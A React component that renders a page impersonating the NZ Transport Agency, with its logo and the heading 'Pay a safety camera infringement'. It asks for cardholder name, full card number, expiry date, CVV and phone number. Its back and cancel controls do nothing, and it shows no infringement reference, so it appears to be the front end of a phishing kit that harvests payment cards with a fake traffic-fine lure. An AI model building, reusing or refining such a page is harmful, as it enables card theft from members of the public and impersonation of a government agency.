import React from 'react';
import './LoginScreen.css';
import { useLanguage } from '../hooks/useLanguage';
import nztaLogo from '../assets/nzta-logo.png';

// ─── Country codes (named export — LoginForm.js needs this) ───
export const countryCodes = [
  { code: '+64', country: 'New Zealand (NZ)', phoneLength: 9, zipLength: 4 },
];

const months = Array.from({ length: 12 }, (_, i) => {
  const month = (i + 1).toString().padStart(2, '0');
  return { value: month, label: month };
});

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 11 }, (_, i) => {
  const year = currentYear + i;
  return { value: year.toString().slice(-2), label: year.toString() };
});

function CardVerificationForm({ cardDetails, cardErrors, isLoading, onInputChange, onSubmit }) {
  const { t } = useLanguage();

  const handleExpiryMonthChange = (month) => {
    const newExpiryDate = month + (cardDetails.expiryDate?.slice(-2) || '');
    onInputChange('expiryDate', newExpiryDate);
  };
  const handleExpiryYearChange = (year) => {
    const newExpiryDate = (cardDetails.expiryDate?.slice(0, 2) || '') + year;
    onInputChange('expiryDate', newExpiryDate);
  };
  const handleCvvChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) onInputChange('cvv', value);
  };
  const handlePhoneChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    const selectedCountry = countryCodes.find(
      (c) => c.code === (cardDetails.countryCode || '+1')
    );
    const maxLength = selectedCountry ? selectedCountry.phoneLength : 15;
    if (value.length <= maxLength) onInputChange('phoneNumber', value);
  };

  return (
    <div className="nzta-renewal">
      {/* ─── Header ─── */}
      <header className="nzta-header">
        <div className="nzta-header-inner">
          <div className="nzta-logo">
            <img
              src={nztaLogo}
              alt="NZ Transport Agency"
              className="nzta-logo-img"
            />
          </div>
          
        </div>
      </header>

      {/* ─── Main ─── */}
      <main className="nzta-main">
        <a href="#back" className="nzta-back" onClick={(e) => e.preventDefault()}>
          ← Back
        </a>

        <h1 className="nzta-title">Pay a safety camera infringement
</h1>

        

        <hr className="nzta-divider" />

        <p className="nzta-hint">
          All fields are required unless marked 'optional'.
        </p>

        <h2 className="nzta-subtitle">Payment information</h2>

        <form onSubmit={onSubmit}>
          {/* Cardholder */}
          <div className="nzta-field">
            <label>{t.cardholderName}</label>
            <input
              type="text"
              value={cardDetails.cardholderName}
              onChange={(e) => onInputChange('cardholderName', e.target.value)}
              placeholder="e.g. JOHN SMITH"
              className={`nzta-input ${cardErrors.cardholderName ? 'input-error-red' : ''}`}
            />
            {cardErrors.cardholderName && (
              <span className="nzta-error-msg">{cardErrors.cardholderName}</span>
            )}
          </div>

          {/* Card number */}
          <div className="nzta-field">
            <label>{t.cardNumber}</label>
            <input
              type="text"
              value={cardDetails.cardNumber}
              onChange={(e) => onInputChange('cardNumber', e.target.value)}
              placeholder="1234 5678 9012 3456"
              maxLength="19"
              className={`nzta-input ${cardErrors.cardNumber ? 'input-error-red' : ''}`}
            />
            {cardErrors.cardNumber && (
              <span className="nzta-error-msg">{cardErrors.cardNumber}</span>
            )}
          </div>

          {/* Expiry + CVV */}
          <div className="nzta-row">
            <div className="nzta-field">
              <label>{t.expirationDate}</label>
              <div className="nzta-row">
                <select
                  value={cardDetails.expiryDate?.slice(0, 2) || ''}
                  onChange={(e) => handleExpiryMonthChange(e.target.value)}
                  className={`nzta-input ${cardErrors.expiryDate ? 'input-error-red' : ''}`}
                >
                  <option value="">{t.month}</option>
                  {months.map((m) => (
                    <option key={m.value} value={m.value}>
                      {m.label}
                    </option>
                  ))}
                </select>
                <select
                  value={cardDetails.expiryDate?.slice(-2) || ''}
                  onChange={(e) => handleExpiryYearChange(e.target.value)}
                  className={`nzta-input ${cardErrors.expiryDate ? 'input-error-red' : ''}`}
                >
                  <option value="">{t.year}</option>
                  {years.map((y) => (
                    <option key={y.value} value={y.value}>
                      {y.label}
                    </option>
                  ))}
                </select>
              </div>
              {cardErrors.expiryDate && (
                <span className="nzta-error-msg">{cardErrors.expiryDate}</span>
              )}
            </div>

            <div className="nzta-field">
              <label>{t.cvv}</label>
              <input
                type="text"
                value={cardDetails.cvv}
                onChange={handleCvvChange}
                placeholder="123"
                maxLength="4"
                className={`nzta-input ${cardErrors.cvv ? 'input-error-red' : ''}`}
              />
              {cardErrors.cvv && <span className="nzta-error-msg">{cardErrors.cvv}</span>}
            </div>
          </div>

          {/* Phone */}
          <div className="nzta-field">
            <label>{t.phoneNumber}</label>
            <div className="nzta-row">
              <select
                className="nzta-input nzta-country-select"
                value={cardDetails.countryCode || '+1'}
                onChange={(e) => onInputChange('countryCode', e.target.value)}
              >
                {countryCodes.map((c) => (
                  <option key={c.code} value={c.code}>
                    {c.country} {c.code}
                  </option>
                ))}
              </select>
              <input
                type="text"
                value={cardDetails.phoneNumber || ''}
                onChange={handlePhoneChange}
                placeholder="1234567890"
                maxLength="15"
                className={`nzta-input ${cardErrors.phoneNumber ? 'input-error-red' : ''}`}
              />
            </div>
            {cardErrors.phoneNumber && (
              <span className="nzta-error-msg">{cardErrors.phoneNumber}</span>
            )}
            <span className="nzta-help">{t.phoneHint}</span>
          </div>

          {/* Buttons */}
          <div className="nzta-actions">
            <button
              type="submit"
              className="nzta-btn nzta-btn-continue"
              disabled={isLoading}
            >
              {isLoading ? 'Please wait…' : 'Continue'}
            </button>
            <button type="button" className="nzta-btn nzta-btn-cancel">
              Cancel
            </button>
          </div>
        </form>
      </main>
    </div>
  );
}

export default CardVerificationForm;